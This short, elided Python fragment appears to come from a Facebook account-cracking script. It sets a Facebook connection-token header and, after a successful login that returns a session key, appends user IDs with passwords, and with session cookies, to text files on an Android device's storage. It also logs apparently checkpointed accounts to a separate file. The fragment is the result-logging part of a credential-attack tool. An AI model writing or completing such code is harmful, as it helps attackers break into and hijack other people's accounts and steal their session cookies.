...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					open('/sdcard/ASMAT_M1_OK.txt','a').write(uid+'|'+pw+'\n')

					open('/sdcard/ASMAT_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					...
					open('/sdcard/ASMAT_M1_CP.txt','a').write(uid+'|'+pw+'\n')
